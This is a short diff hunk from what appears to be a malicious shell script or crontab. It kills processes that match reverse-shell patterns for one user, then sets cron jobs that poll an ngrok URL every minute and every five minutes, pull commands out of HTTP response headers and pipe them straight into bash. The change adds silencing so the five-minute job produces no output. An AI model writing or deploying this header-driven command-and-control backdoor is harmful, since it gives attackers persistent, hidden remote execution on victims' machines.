@@ -8,7 +8,7 @@ pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|scrip
 # CRON job
 # Looks cryptic at a glance
 */1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
-*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null
+*/5 * * * * curl -sI https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null > /dev/null 2>&1
 
 
 # RIG
